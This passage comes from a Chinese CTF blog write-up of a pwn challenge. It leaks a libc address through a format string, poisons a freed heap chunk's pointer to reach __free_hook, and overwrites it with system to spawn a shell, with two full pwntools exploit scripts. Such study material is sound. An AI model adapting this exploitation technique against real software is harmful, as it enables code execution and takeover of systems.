<p>发现偏移15的地方存在__libc_start_main函数地址。不过由于这是sprintf函数，它的参数format存在rsi寄存器上，rdi已经被第一个参数占了，再填数据时是从rsi开始，跳过了rdi寄存器。因此是20（15+5）</p>
<p>此处接收libc基地址的payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span><span class="comment">#0x21c87是泄露的地址与libc基地址的偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<p>然后就可以获取__free_hook的地址了，我们将其布置在这个地方</p>
<p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p>
<p>此时我们利用溢出将free掉的chunk的fd指针改成了__free_hook的地址，同时可以看见bins中已经出现了__free_hook的地址（如下图）</p>
<p><img src="/../img/2706180-20220514182802712-1937798255.png"></p>
<p>此时的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(free_hook)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后我们只需要两次malloc，就可以申请到一个位置在__free_hook地址上的堆块。</p>
<p>接着我们用memcpy函数把system的地址写在__free_hook堆块里（效果如下），此时__free_hook指向的就是system了。</p>
<p><img src="/../img/2706180-20220514181316800-65373104.png"></p>
<p><img src="/../img/2706180-20220514180301381-730330410.png" alt="image-20220514154108694"></p>
<p>最后我们要free掉一个chunk，这个chunk里面装的都有什么不重要，只需要让这个chunk的地址去指向&#x2F;bin&#x2F;sh这个字符串即可（是指向的字符串，而非字符串的地址，因为system需要的是一个指向&#x2F;bin&#x2F;sh的地址，chunk的地址已经是一个指针了，我们并不需要再传一个指针，只需要写入字符串&#x2F;bin&#x2F;sh即可）</p>
<p><img src="/../img/2706180-20220514180300891-657482779.png" alt="image-20220514155318872"></p>
<p>最后执行free即可获取shell。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)</span><br><span class="line">fake_chunk2=p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line">p.send(fake_chunk2)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776258&#x27;</span>)<span class="comment">#malloc(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184614914&#x27;</span>)<span class="comment">#memcpy(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326592&#x27;</span>)<span class="comment">#free(0)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/378831b9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/378831b9.html" class="post-title-link" itemprop="url">程序实现单链表上的一个漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-22 12:23:38" itemprop="dateModified" datetime="2022-11-22T12:23:38+08:00">2022-11-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%A7%81%E6%88%BF%E8%8F%9C/" itemprop="url" rel="index"><span itemprop="name">私房菜</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/378831b9.html#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
